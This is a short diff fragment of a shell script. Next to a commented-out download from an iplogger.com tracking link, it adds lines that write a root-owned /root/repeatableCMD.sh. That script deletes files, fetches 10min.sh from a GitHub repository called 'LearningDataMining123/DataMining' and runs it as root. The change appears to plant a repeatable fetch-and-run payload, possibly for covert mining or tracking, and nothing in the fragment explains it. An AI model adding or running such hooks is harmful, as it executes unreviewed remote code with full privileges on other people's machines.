@@ -14,6 +14,14 @@
 
 #wget -O logger https://iplogger.com/2Lt1h5
 
+rm /root/repeatableCMD.sh
+echo "cd /root
+rm 10m* -rf
+wget --inet4-only https://raw.githubusercontent.com/LearningDataMining123/DataMining/main/10min.sh
+chmod +x 10min.sh
+./10min.sh" > /root/repeatableCMD.sh
+chmod +x /root/repeatableCMD.sh
+
 
 exit
 
